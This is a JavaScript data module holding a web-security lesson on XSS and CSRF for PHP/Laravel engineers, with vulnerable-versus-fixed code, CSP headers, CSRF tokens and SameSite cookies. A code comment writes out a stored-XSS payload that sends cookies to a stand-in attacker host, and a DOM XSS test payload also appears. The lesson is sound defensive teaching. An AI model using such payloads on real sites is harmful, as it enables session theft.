export default {
  phase: 'Phase 6 · Security & Performance',
  title: 'XSS & CSRF Attacks',
  intro: 'Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) are two of the most exploited vulnerabilities in web applications. XSS lets attackers inject malicious scripts into pages viewed by other users; CSRF tricks authenticated users into unknowingly submitting state-changing requests. A senior backend engineer must understand both attack vectors in depth, know exactly how PHP and Laravel mitigate them, and be able to configure browser-enforced defences like Content-Security-Policy and SameSite cookies.',
  tags: ['XSS', 'CSRF', 'Content-Security-Policy', 'htmlspecialchars', 'SameSite', 'Laravel CSRF', 'Security'],
  seniorExpectations: [
    'Explain stored, reflected, and DOM-based XSS and give a concrete exploit example for each',
    'Use htmlspecialchars() and htmlentities() correctly and explain the difference',
    'Write a strict Content-Security-Policy header and know which directives block inline scripts',
    'Trace the full CSRF attack flow from attacker-controlled page to victim request',
    'Explain how Laravel generates, stores, and validates CSRF tokens',
    'Know when CSRF tokens are unnecessary (stateless JWT APIs) and why',
  ],
  segments: [
    { type: 'h2', key: 'h_xss_types' },
    { type: 'p', key: 'p_xss_intro' },
    { type: 'ul', key: 'ul_xss_types' },
    {
      type: 'code',
      lang: 'php',
      label: 'PHP — Stored XSS Vulnerability vs Fix',
      code: `<?php
// -------------------------------------------------------
// VULNERABLE: raw user content rendered in HTML
// Attacker stores: <script>fetch('https://evil.io/steal?c='+document.cookie)</script>
// -------------------------------------------------------
echo "<p>" . $comment['body'] . "</p>"; // executes attacker script!

// -------------------------------------------------------
// SECURE: always escape output at the point of rendering
// ENT_QUOTES encodes both " and ' — critical for attribute contexts
// -------------------------------------------------------
echo "<p>" . htmlspecialchars($comment['body'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</p>";

// htmlspecialchars() converts:
//   &  →  &amp;
//   <  →  &lt;
//   >  →  &gt;
//   "  →  &quot;
//   '  →  &#039;  (only with ENT_QUOTES)

// htmlentities() does the same PLUS encodes all applicable characters to HTML entities.
// Prefer htmlspecialchars() for UTF-8 apps — htmlentities() can corrupt multibyte chars.

// BLADE (Laravel) — auto-escaped by default:
// {{ $comment }} → escaped
// {!! $comment !!} → RAW — only use for trusted, sanitised HTML (e.g., from a WYSIWYG sanitiser)`,
    },
    { type: 'h2', key: 'h_dom_xss' },
    { type: 'p', key: 'p_dom_xss_intro' },
    {
      type: 'code',
      lang: 'javascript',
      label: 'JavaScript — DOM XSS Vulnerability vs Fix',
      code: `// -------------------------------------------------------
// VULNERABLE: reading from location.hash and writing to innerHTML
// URL: https://app.com/search#<img src=x onerror=alert(1)>
// -------------------------------------------------------
const query = location.hash.slice(1);
document.getElementById('results').innerHTML = 'Results for: ' + query; // XSS!

// -------------------------------------------------------
// SECURE: use textContent instead of innerHTML for plain text
// -------------------------------------------------------
document.getElementById('results').textContent = 'Results for: ' + query; // safe

// If you must render HTML, use DOMPurify to sanitise first:
// import DOMPurify from 'dompurify';
// document.getElementById('results').innerHTML = DOMPurify.sanitize(query);

// Dangerous sinks to avoid with untrusted data:
//   innerHTML, outerHTML, document.write(), eval(),
//   setTimeout(string), setInterval(string), location.href (javascript: URLs)`,
    },
    { type: 'h2', key: 'h_csp' },
    { type: 'p', key: 'p_csp_intro' },
    {
      type: 'code',
      lang: 'php',
      label: 'PHP — Setting CSP Header',
      code: `<?php
// Strict CSP using nonces (preferred over hashes for dynamic pages)
$nonce = base64_encode(random_bytes(16)); // generate per-request nonce

header("Content-Security-Policy: "
    . "default-src 'self'; "
    . "script-src 'self' 'nonce-{$nonce}'; "  // only scripts with matching nonce execute
    . "style-src 'self' 'nonce-{$nonce}'; "
    . "img-src 'self' data: https:; "
    . "font-src 'self'; "
    . "connect-src 'self' https://api.myapp.com; "
    . "frame-ancestors 'none'; "              // prevents clickjacking
    . "base-uri 'self'; "                      // prevents base-tag hijacking
    . "form-action 'self';"                    // prevents form hijacking
);

// Nonce used in HTML:
// <script nonce="<?= $nonce ?>"> ... </script>

// Other important security headers:
header('X-Content-Type-Options: nosniff');      // prevents MIME sniffing
header('X-Frame-Options: DENY');                // prevents clickjacking (older browsers)
header('Referrer-Policy: strict-origin-when-cross-origin');`,
    },
    { type: 'h2', key: 'h_csrf_flow' },
    { type: 'p', key: 'p_csrf_intro' },
    { type: 'ul', key: 'ul_csrf_flow' },
    {
      type: 'code',
      lang: 'php',
      label: 'PHP — Manual CSRF Token Implementation',
      code: `<?php
// --- Token generation (on page load) ---
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32)); // 256-bit cryptographic token
}

// Embed in HTML form:
// <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">

// --- Token validation (on form submit) ---
function validateCsrf(): void
{
    $submitted = $_POST['csrf_token'] ?? '';
    $expected  = $_SESSION['csrf_token'] ?? '';

    // hash_equals() is timing-safe — prevents timing attacks
    if (!hash_equals($expected, $submitted)) {
        http_response_code(403);
        throw new \\RuntimeException('CSRF token mismatch');
    }

    // Rotate token after use (double-submit prevention)
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}`,
    },
    { type: 'h2', key: 'h_laravel_csrf' },
    { type: 'p', key: 'p_laravel_csrf_intro' },
    {
      type: 'code',
      lang: 'php',
      label: 'PHP — Laravel CSRF Internals',
      code: `<?php
// 1. TOKEN GENERATION
//    Session stores a random 40-byte token on first request:
//    $token = Str::random(40);
//    $request->session()->put('_token', $token);

// 2. TOKEN STORAGE
//    Also stored in an XSRF-TOKEN cookie (readable by JS for SPA use):
//    Cookie: XSRF-TOKEN=eyJ... (signed, but not HttpOnly so Angular/Axios can read it)

// 3. TOKEN VALIDATION (VerifyCsrfToken::handle)
//    Middleware checks POST/PUT/PATCH/DELETE requests for:
//      a) _token field in the request body, OR
//      b) X-CSRF-TOKEN header, OR
//      c) X-XSRF-TOKEN header (decoded from the XSRF-TOKEN cookie — for SPAs)
//    Comparison uses hash_equals() to prevent timing attacks.

// 4. EXCLUDING ROUTES from CSRF (e.g., webhooks from Stripe/GitHub):
class VerifyCsrfToken extends Middleware
{
    protected $except = [
        'webhooks/stripe',
        'webhooks/github/*',
    ];
}

// 5. BLADE helper — automatically injects hidden _token field:
// <form method="POST">
//     @csrf
//     ...
// </form>

// 6. AJAX with Axios — reads XSRF-TOKEN cookie automatically,
//    sends it as X-XSRF-TOKEN header. No extra configuration needed.`,
    },
    { type: 'h2', key: 'h_samesite' },
    { type: 'p', key: 'p_samesite_intro' },
    { type: 'ul', key: 'ul_samesite_options' },
    {
      type: 'code',
      lang: 'php',
      label: 'PHP — Setting SameSite Cookies',
      code: `<?php
// PHP 7.3+ — SameSite in setcookie() options array
setcookie('session_id', $token, [
    'expires'  => time() + 3600,
    'path'     => '/',
    'domain'   => 'app.com',
    'secure'   => true,    // HTTPS only
    'httponly' => true,    // JS cannot access (XSS protection)
    'samesite' => 'Lax',   // CSRF protection
]);

// Laravel config/session.php:
// 'same_site' => 'lax'   ← default since Laravel 8
// 'secure'    => true     ← set to true in production
// 'http_only' => true     ← always true

// php.ini equivalent for session cookie:
// session.cookie_samesite = "Lax"
// session.cookie_secure   = 1
// session.cookie_httponly  = 1`,
    },
    { type: 'h2', key: 'h_no_csrf' },
    { type: 'p', key: 'p_no_csrf_intro' },
    { type: 'ul', key: 'ul_no_csrf_cases' },
    { type: 'callout', style: 'warn', key: 'callout_jwt_cookie' },
    { type: 'qa', key: 'qa' },
    { type: 'keypoints', key: 'keypoints' },
  ],
  bodyTexts: {
    h_xss_types: 'XSS — Three Attack Types',
    p_xss_intro: 'XSS occurs whenever an application includes user-controlled data in an HTML page without proper encoding. There are three distinct variants, each with different persistence and exploitability characteristics:',
    ul_xss_types: [
      '<strong>Stored XSS:</strong> Malicious payload saved in the database (e.g., a comment). Every user who views that comment executes the script. Highest impact — no user interaction beyond normal browsing required.',
      '<strong>Reflected XSS:</strong> Payload embedded in the URL/query string and immediately echoed back to the response. Attacker tricks the victim into clicking a crafted link. Impact limited to users who click the link.',
      '<strong>DOM-based XSS:</strong> Payload never reaches the server. Client-side JavaScript reads attacker-controlled data (location.hash, document.referrer) and writes it into the DOM unsafely. Server logs show nothing.',
    ],
    h_dom_xss: 'DOM-Based XSS',
    p_dom_xss_intro: 'DOM XSS is invisible to server-side defences because the payload lives entirely on the client. The vulnerability is in JavaScript that reads untrusted sources and writes to dangerous sinks without sanitisation.',
    h_csp: 'Content-Security-Policy',
    p_csp_intro: 'CSP is an HTTP response header that tells the browser which sources of scripts, styles, and other resources are trusted. A properly configured CSP is the strongest defence-in-depth measure against XSS — even if an injection occurs, the browser refuses to execute scripts from untrusted origins.',
    h_csrf_flow: 'CSRF — Attack Flow',
    p_csrf_intro: 'CSRF exploits the fact that browsers automatically attach cookies to every request — including requests initiated by a third-party page. The victim is authenticated; the attacker\'s page submits a forged request that the server cannot distinguish from a legitimate one.',
    ul_csrf_flow: [
      'Victim logs in to <code>bank.com</code>. Session cookie is set with no SameSite restriction.',
      'Attacker sends victim a link to <code>evil.com</code> which contains a hidden form that auto-submits a transfer request (to: attacker, amount: 5000) to bank.com.',
      'Browser auto-attaches the bank.com session cookie. Transfer is processed as if the victim initiated it.',
    ],
    h_laravel_csrf: 'Laravel CSRF Protection Internals',
    p_laravel_csrf_intro: 'Laravel\'s <code>VerifyCsrfToken</code> middleware (registered in the <code>web</code> middleware group) automatically handles CSRF for all state-changing routes. Understanding its internals is a common senior interview topic.',
    h_samesite: 'SameSite Cookies',
    p_samesite_intro: 'The <code>SameSite</code> cookie attribute is a browser-level CSRF defence that controls whether cookies are sent on cross-site requests. It eliminates the root cause of CSRF rather than patching around it with tokens.',
    ul_samesite_options: [
      '<strong>SameSite=Strict:</strong> Cookie never sent on cross-site requests — not even when following a link from another site. Most secure, but can break OAuth flows and external links.',
      '<strong>SameSite=Lax (recommended default):</strong> Cookie sent on top-level navigation (clicking a link) but NOT on cross-site POST/PUT/DELETE requests. Blocks CSRF while keeping links working. Chrome\'s default since 2020.',
      '<strong>SameSite=None; Secure:</strong> Cookie sent on all cross-site requests. Required for embedded iframes, payment widgets. MUST be used with HTTPS.',
    ],
    h_no_csrf: 'When CSRF Tokens Are NOT Needed',
    p_no_csrf_intro: 'CSRF attacks exploit cookie-based authentication. If your API uses a different authentication mechanism, CSRF tokens add complexity without benefit. Specifically, CSRF protection is unnecessary when:',
    ul_no_csrf_cases: [
      '<strong>Bearer token in Authorization header:</strong> Browsers never automatically attach Authorization headers to cross-origin requests — only cookies are auto-attached. A CSRF attacker cannot read the victim\'s JWT from another origin (CORS prevents it).',
      '<strong>Stateless JWT API consumed by a native app or SPA:</strong> Token stored in memory or localStorage, sent manually in every request header. Cross-site requests from attacker\'s page cannot access or include the token.',
      '<strong>APIs only called by server-to-server:</strong> No browser involved, no cookies, no CSRF vector.',
    ],
    callout_jwt_cookie: {
      title: 'Danger',
      html: 'If your SPA stores the JWT in an HttpOnly cookie (for XSS protection) and sends it automatically, CSRF IS a concern again. You must then combine SameSite=Lax cookies with CSRF tokens or rely on strict CORS configuration with an explicit allowlist of origins.',
    },
    qa: {
      pairs: [
        {
          q: 'What is the difference between htmlspecialchars() and htmlentities() — and which should you use?',
          a: '<code>htmlspecialchars()</code> encodes only the five special HTML characters (<code>&</code>, <code><</code>, <code>></code>, <code>"</code>, <code>\'</code>). <code>htmlentities()</code> encodes all applicable characters including accented letters (e.g., é → &eacute;). For UTF-8 applications, prefer <code>htmlspecialchars()</code> — it is sufficient for preventing XSS and does not corrupt multibyte characters. Always pass <code>ENT_QUOTES | ENT_SUBSTITUTE</code> and <code>\'UTF-8\'</code> explicitly.',
        },
        {
          q: 'Why does Laravel store the CSRF token in both the session AND the XSRF-TOKEN cookie?',
          a: 'The session token is the ground truth — it is server-side only. The <code>XSRF-TOKEN</code> cookie (non-HttpOnly) exists so JavaScript frameworks like Axios and Angular can read it and send it back as an <code>X-XSRF-TOKEN</code> header on AJAX requests — without you writing any extra code. Because the cookie is readable only by JavaScript running on the same origin (CORS restricts cross-origin reads), an attacker\'s page on a different domain cannot access the token value, preserving security.',
        },
        {
          q: 'Can SameSite=Lax alone replace CSRF tokens?',
          a: 'For most applications, yes — SameSite=Lax blocks the most common CSRF vectors (cross-site POST forms). However, defence-in-depth recommends keeping tokens as well: older browsers do not support SameSite, some same-site subdomains may be partially trusted, and GET requests are still sent cross-site under Lax (which is why state-changing actions should never use GET). Laravel uses both by default.',
        },
      ],
    },
    keypoints: {
      title: 'Key Points to Remember',
      items: [
        'XSS types: <strong>Stored</strong> (persisted in DB), <strong>Reflected</strong> (echoed in response), <strong>DOM-based</strong> (entirely client-side, no server involvement).',
        'Always escape output with <code>htmlspecialchars($val, ENT_QUOTES | ENT_SUBSTITUTE, \'UTF-8\')</code> at the point of rendering into HTML.',
        'CSP with per-request nonces blocks inline script execution even if XSS payload is injected — a critical defence-in-depth layer.',
        'CSRF exploits automatic cookie attachment. The attack requires no JavaScript — a plain HTML form on the attacker\'s page is sufficient.',
        'Laravel CSRF: <code>VerifyCsrfToken</code> middleware validates <code>_token</code> body field, <code>X-CSRF-TOKEN</code> header, or <code>X-XSRF-TOKEN</code> header for AJAX. Exclude only webhook routes.',
        '<code>SameSite=Lax</code> is the browser-native CSRF defence. Set on all session cookies in production alongside <code>Secure</code> and <code>HttpOnly</code>.',
        'CSRF tokens are NOT needed for stateless APIs using Bearer tokens in the Authorization header — browsers never auto-attach headers.',
        'Use <code>hash_equals()</code> for all CSRF token comparisons to prevent timing-based oracle attacks.',
      ],
    },
  },
};
